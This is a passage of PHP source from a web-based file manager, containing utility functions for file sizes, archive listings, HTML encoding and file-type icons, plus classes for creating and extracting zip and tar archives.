 */
function fm_get_filesize($size)
{
    if ($size < 1000) {
        return sprintf('%s B', $size);
    } elseif (($size / 1024) < 1000) {
        return sprintf('%s KB', round(($size / 1024), 2));
    } elseif (($size / 1024 / 1024) < 1000) {
        return sprintf('%s MB', round(($size / 1024 / 1024), 2));
    } elseif (($size / 1024 / 1024 / 1024) < 1000) {
        return sprintf('%s GB', round(($size / 1024 / 1024 / 1024), 2));
    } else {
        return sprintf('%s TB', round(($size / 1024 / 1024 / 1024 / 1024), 2));
    }
}

/**
 * Get director total size
 * @param string $directory
 * @return string
 */
function fm_get_directorysize($directory) {
    global $calc_folder;
    if ($calc_folder==true) { //  Slower output
      $size = 0;  $count= 0;  $dirCount= 0;
    foreach(new RecursiveIteratorIterator(new RecursiveDirectoryIterator($directory)) as $file)
    if ($file->isFile())
        {   $size+=$file->getSize();
            $count++;
        }
    else if ($file->isDir()) { $dirCount++; }
    // return [$size, $count, $dirCount];
    return fm_get_filesize($size);
    }
    else return 'Folder'; //  Quick output
}

/**
 * Get info about zip archive
 * @param string $path
 * @return array|bool
 */
function fm_get_zif_info($path, $ext) {
    if ($ext == 'zip' && function_exists('zip_open')) {
        $arch = zip_open($path);
        if ($arch) {
            $filenames = array();
            while ($zip_entry = zip_read($arch)) {
                $zip_name = zip_entry_name($zip_entry);
                $zip_folder = substr($zip_name, -1) == '/';
                $filenames[] = array(
                    'name' => $zip_name,
                    'filesize' => zip_entry_filesize($zip_entry),
                    'compressed_size' => zip_entry_compressedsize($zip_entry),
                    'folder' => $zip_folder
                    //'compression_method' => zip_entry_compressionmethod($zip_entry),
                );
            }
            zip_close($arch);
            return $filenames;
        }
    } elseif($ext == 'tar' && class_exists('PharData')) {
        $archive = new PharData($path);
        $filenames = array();
        foreach(new RecursiveIteratorIterator($archive) as $file) {
            $parent_info = $file->getPathInfo();
            $zip_name = str_replace("phar://".$path, '', $file->getPathName());
            $zip_name = substr($zip_name, ($pos = strpos($zip_name, '/')) !== false ? $pos + 1 : 0);
            $zip_folder = $parent_info->getFileName();
            $zip_info = new SplFileInfo($file);
            $filenames[] = array(
                'name' => $zip_name,
                'filesize' => $zip_info->getSize(),
                'compressed_size' => $file->getCompressedSize(),
                'folder' => $zip_folder
            );
        }
        return $filenames;
    }
    return false;
}

/**
 * Encode html entities
 * @param string $text
 * @return string
 */
function fm_enc($text)
{
    return htmlspecialchars($text, ENT_QUOTES, 'UTF-8');
}

/**
 * Save message in session
 * @param string $msg
 * @param string $status
 */
function fm_set_msg($msg, $status = 'ok')
{
    $_SESSION[FM_SESSION_ID]['message'] = $msg;
    $_SESSION[FM_SESSION_ID]['status'] = $status;
}

/**
 * Check if string is in UTF-8
 * @param string $string
 * @return int
 */
function fm_is_utf8($string)
{
    return preg_match('//u', $string);
}

/**
 * Convert file name to UTF-8 in Windows
 * @param string $filename
 * @return string
 */
function fm_convert_win($filename)
{
    if (FM_IS_WIN && function_exists('iconv')) {
        $filename = iconv(FM_ICONV_INPUT_ENC, 'UTF-8//IGNORE', $filename);
    }
    return $filename;
}

/**
 * @param $obj
 * @return array
 */
function fm_object_to_array($obj)
{
    if (!is_object($obj) && !is_array($obj)) {
        return $obj;
    }
    if (is_object($obj)) {
        $obj = get_object_vars($obj);
    }
    return array_map('fm_object_to_array', $obj);
}

/**
 * Get CSS classname for file
 * @param string $path
 * @return string
 */
function fm_get_file_icon_class($path)
{
    // get extension
    $ext = strtolower(pathinfo($path, PATHINFO_EXTENSION));

    switch ($ext) {
        case 'ico':
        case 'gif':
        case 'jpg':
        case 'jpeg':
        case 'jpc':
        case 'jp2':
        case 'jpx':
        case 'xbm':
        case 'wbmp':
        case 'png':
        case 'bmp':
        case 'tif':
        case 'tiff':
        case 'svg':
            $img = 'fa fa-picture-o';
            break;
        case 'passwd':
        case 'ftpquota':
        case 'sql':
        case 'js':
        case 'json':
        case 'sh':
        case 'config':
        case 'twig':
        case 'tpl':
        case 'md':
        case 'gitignore':
        case 'c':
        case 'cpp':
        case 'cs':
        case 'py':
        case 'map':
        case 'lock':
        case 'dtd':
            $img = 'fa fa-file-code-o';
            break;
        case 'txt':
        case 'ini':
        case 'conf':
        case 'log':
        case 'htaccess':
            $img = 'fa fa-file-text-o';
            break;
        case 'css':
        case 'less':
        case 'sass':
        case 'scss':
            $img = 'fa fa-css3';
            break;
        case 'zip':
        case 'rar':
        case 'gz':
        case 'tar':
        case '7z':
            $img = 'fa fa-file-archive-o';
            break;
        case 'php':
        case 'php4':
        case 'php5':
        case 'phps':
        case 'phtml':
            $img = 'fa fa-code';
            break;
        case 'htm':
        case 'html':
        case 'shtml':
        case 'xhtml':
            $img = 'fa fa-html5';
            break;
        case 'xml':
        case 'xsl':
            $img = 'fa fa-file-excel-o';
            break;
        case 'wav':
        case 'mp3':
        case 'mp2':
        case 'm4a':
        case 'aac':
        case 'ogg':
        case 'oga':
        case 'wma':
        case 'mka':
        case 'flac':
        case 'ac3':
        case 'tds':
            $img = 'fa fa-music';
            break;
        case 'm3u':
        case 'm3u8':
        case 'pls':
        case 'cue':
            $img = 'fa fa-headphones';
            break;
        case 'avi':
        case 'mpg':
        case 'mpeg':
        case 'mp4':
        case 'm4v':
        case 'flv':
        case 'f4v':
        case 'ogm':
        case 'ogv':
        case 'mov':
        case 'mkv':
        case '3gp':
        case 'asf':
        case 'wmv':
            $img = 'fa fa-file-video-o';
            break;
        case 'eml':
        case 'msg':
            $img = 'fa fa-envelope-o';
            break;
        case 'xls':
        case 'xlsx':
            $img = 'fa fa-file-excel-o';
            break;
        case 'csv':
            $img = 'fa fa-file-text-o';
            break;
        case 'bak':
            $img = 'fa fa-clipboard';
            break;
        case 'doc':
        case 'docx':
            $img = 'fa fa-file-word-o';
            break;
        case 'ppt':
        case 'pptx':
            $img = 'fa fa-file-powerpoint-o';
            break;
        case 'ttf':
        case 'ttc':
        case 'otf':
        case 'woff':
        case 'woff2':
        case 'eot':
        case 'fon':
            $img = 'fa fa-font';
            break;
        case 'pdf':
            $img = 'fa fa-file-pdf-o';
            break;
        case 'psd':
        case 'ai':
        case 'eps':
        case 'fla':
        case 'swf':
            $img = 'fa fa-file-image-o';
            break;
        case 'exe':
        case 'msi':
            $img = 'fa fa-file-o';
            break;
        case 'bat':
            $img = 'fa fa-terminal';
            break;
        default:
            $img = 'fa fa-info-circle';
    }

    return $img;
}

/**
 * Get image files extensions
 * @return array
 */
function fm_get_image_exts()
{
    return array('ico', 'gif', 'jpg', 'jpeg', 'jpc', 'jp2', 'jpx', 'xbm', 'wbmp', 'png', 'bmp', 'tif', 'tiff', 'psd', 'svg');
}

/**
 * Get video files extensions
 * @return array
 */
function fm_get_video_exts()
{
    return array('webm', 'mp4', 'm4v', 'ogm', 'ogv', 'mov', 'mkv');
}

/**
 * Get audio files extensions
 * @return array
 */
function fm_get_audio_exts()
{
    return array('wav', 'mp3', 'ogg', 'm4a');
}

/**
 * Get text file extensions
 * @return array
 */
function fm_get_text_exts()
{
    return array(
        'txt', 'css', 'ini', 'conf', 'log', 'htaccess', 'passwd', 'ftpquota', 'sql', 'js', 'json', 'sh', 'config',
        'php', 'php4', 'php5', 'phps', 'phtml', 'htm', 'html', 'shtml', 'xhtml', 'xml', 'xsl', 'm3u', 'm3u8', 'pls', 'cue',
        'eml', 'msg', 'csv', 'bat', 'twig', 'tpl', 'md', 'gitignore', 'less', 'sass', 'scss', 'c', 'cpp', 'cs', 'py',
        'map', 'lock', 'dtd', 'svg', 'scss', 'asp', 'aspx', 'asx', 'asmx', 'ashx', 'jsx', 'jsp', 'jspx', 'cfm', 'cgi'
    );
}

/**
 * Get mime types of text files
 * @return array
 */
function fm_get_text_mimes()
{
    return array(
        'application/xml',
        'application/javascript',
        'application/x-javascript',
        'image/svg+xml',
        'message/rfc822',
    );
}

/**
 * Get file names of text files w/o extensions
 * @return array
 */
function fm_get_text_names()
{
    return array(
        'license',
        'readme',
        'authors',
        'contributors',
        'changelog',
    );
}

/**
 * Get online docs viewer supported files extensions
 * @return array
 */
function fm_get_onlineViewer_exts()
{
    return array('doc', 'docx', 'xls', 'xlsx', 'pdf', 'ppt', 'pptx', 'ai', 'psd', 'dxf', 'xps', 'rar');
}

/**
 * Class to work with zip files (using ZipArchive)
 */
class FM_Zipper
{
    private $zip;

    public function __construct()
    {
        $this->zip = new ZipArchive();
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($filename, $files)
    {
        $res = $this->zip->open($filename, ZipArchive::CREATE);
        if ($res !== true) {
            return false;
        }
        if (is_array($files)) {
            foreach ($files as $f) {
                if (!$this->addFileOrDir($f)) {
                    $this->zip->close();
                    return false;
                }
            }
            $this->zip->close();
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                $this->zip->close();
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($filename, $path)
    {
        $res = $this->zip->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->zip->extractTo($path)) {
            $this->zip->close();
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->zip->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($path)
    {
        if (!$this->zip->addEmptyDir($path)) {
            return false;
        }
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        if (!$this->zip->addFile($path . '/' . $file)) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}

/**
 * Class to work with Tar files (using PharData)
 */
class FM_Zipper_Tar
{
    private $tar;

    public function __construct()
    {
        $this->tar = null;
    }

    /**
     * Create archive with name $filename and files $files (RELATIVE PATHS!)
     * @param string $filename
     * @param array|string $files
     * @return bool
     */
    public function create($filename, $files)
    {
        $this->tar = new PharData($filename);
        if (is_array($files)) {
            foreach ($files as $f) {
                if (!$this->addFileOrDir($f)) {
                    return false;
                }
            }
            return true;
        } else {
            if ($this->addFileOrDir($files)) {
                return true;
            }
            return false;
        }
    }

    /**
     * Extract archive $filename to folder $path (RELATIVE OR ABSOLUTE PATHS)
     * @param string $filename
     * @param string $path
     * @return bool
     */
    public function unzip($filename, $path)
    {
        $res = $this->tar->open($filename);
        if ($res !== true) {
            return false;
        }
        if ($this->tar->extractTo($path)) {
            return true;
        }
        return false;
    }

    /**
     * Add file/folder to archive
     * @param string $filename
     * @return bool
     */
    private function addFileOrDir($filename)
    {
        if (is_file($filename)) {
            return $this->tar->addFile($filename);
        } elseif (is_dir($filename)) {
            return $this->addDir($filename);
        }
        return false;
    }

    /**
     * Add folder recursively
     * @param string $path
     * @return bool
     */
    private function addDir($path)
    {
        $objects = scandir($path);
        if (is_array($objects)) {
            foreach ($objects as $file) {
                if ($file != '.' && $file != '..') {
                    if (is_dir($path . '/' . $file)) {
                        if (!$this->addDir($path . '/' . $file)) {
                            return false;
                        }
                    } elseif (is_file($path . '/' . $file)) {
                        try {
                            $this->tar->addFile($path . '/' . $file);
                        } catch (Exception $e) {
                            return false;
                        }
                    }
                }
            }
            return true;
        }
        return false;
    }
}
?>